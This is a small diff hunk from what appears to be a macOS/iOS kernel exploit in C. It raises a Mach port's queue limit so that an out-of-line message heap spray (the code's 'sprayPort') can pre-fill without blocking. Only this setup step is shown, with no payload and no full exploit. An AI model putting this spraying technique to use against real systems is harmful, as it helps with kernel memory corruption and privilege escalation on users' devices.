@@ -3536,6 +3536,10 @@ static const char kOpenPropertiesGarbage[] =
     __block int sprayReady = 0;
     if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &sprayPort) == KERN_SUCCESS) {
         mach_port_insert_right(mach_task_self_, sprayPort, sprayPort, MACH_MSG_TYPE_MAKE_SEND);
+        // Default port queue limit is 5 — bump it so the pre-fill doesn't block
+        mach_port_msgcount_t qlimit = (mach_port_msgcount_t)(kOolMsgCount + 10);
+        mach_port_set_attributes(mach_task_self_, sprayPort, MACH_PORT_QLIMIT,
+            (mach_port_info_t)&qlimit, sizeof(qlimit));
         sprayReady = 1;
     }
 
